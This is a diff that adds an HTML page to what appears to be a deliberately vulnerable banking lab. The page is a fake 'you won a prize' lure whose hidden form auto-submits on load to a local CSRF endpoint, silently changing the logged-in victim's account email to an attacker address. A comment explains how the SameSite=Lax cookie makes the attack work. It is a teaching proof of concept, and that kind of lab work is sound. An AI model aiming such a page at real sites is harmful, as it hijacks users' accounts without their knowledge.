@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>🎉 You won a prize!</title>
+<style>body{font-family:system-ui,sans-serif;text-align:center;margin-top:4rem;color:#333}</style></head>
+<body>
+  <h1>🎉 Congratulations!</h1>
+  <p>You are today's lucky visitor. Loading your reward…</p>
+
+  <!--
+    This stands in for an attacker's site (e.g. evil.example). The victim is
+    already logged into BankVWA in another tab. A top-level GET navigation carries
+    the victim's SameSite=Lax session cookie, so the bank treats this as the user.
+    Because /labs/csrf.php changes the email on a GET with no CSRF token, the
+    victim's account email is silently hijacked. Change the URL if your app is not
+    on localhost:8080.
+  -->
+  <form id="x" action="http://localhost:8080/labs/csrf.php" method="get">
+    <input type="hidden" name="email" value="attacker@evil.example">
+  </form>
+  <script>document.getElementById('x').submit();</script>
+</body>
+</html>
